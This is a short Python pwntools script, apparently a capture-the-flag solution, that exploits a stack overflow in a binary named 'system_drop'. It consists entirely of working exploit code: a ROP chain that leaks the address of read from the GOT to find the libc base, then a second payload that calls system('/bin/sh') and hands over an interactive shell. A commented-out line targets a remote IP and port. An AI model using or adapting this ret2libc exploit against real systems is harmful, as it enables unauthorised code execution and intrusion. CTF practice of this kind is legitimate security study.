from pwn import *
from time import sleep
#p = remote("178.62.113.165", 31535)
p = process("./system_drop")
elf = ELF("system_drop")
libc = elf.libc
pop_rdi = 0x00000000004005d3
syscall = 0x000000000040053b
pop_rsi = 0x00000000004005d1


payload = b"A"*40
payload += p64(pop_rsi)
payload += p64(elf.got['read'])
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(syscall)
payload += p64(elf.symbols['main'])

pause()
p.send(payload)
sleep(1)

libc.address = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['read']
print(hex(libc.address))
p.recv()

payload = b"A"*40
payload += p64(0x0000000000400416)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(0x0000000000400416)
payload += p64(libc.symbols['system'])

p.send(payload)
p.interactive()